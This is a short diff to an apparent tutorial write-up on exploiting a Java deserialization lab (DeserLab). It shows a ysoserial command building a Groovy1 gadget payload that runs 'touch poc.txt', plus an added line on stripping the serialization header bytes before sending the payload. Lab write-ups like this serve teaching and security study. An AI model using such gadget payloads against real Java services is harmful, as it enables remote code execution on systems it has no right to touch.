@@ -219,6 +219,7 @@ We can clearly see that the last part of the data flow is the "nb.deser.HashRequ
 java -jar ysoserial.jar Groovy1 "touch poc.txt" > thepayload.bin
 ```
 
+Ofc we put our payload without **0xAC ED 00 05**,because generated payload statrs with it. 
 How it should look like:
 ```
 java -jar SerializationDumper.jar -r ../DeserLab-v1.0/withpayload.bin 
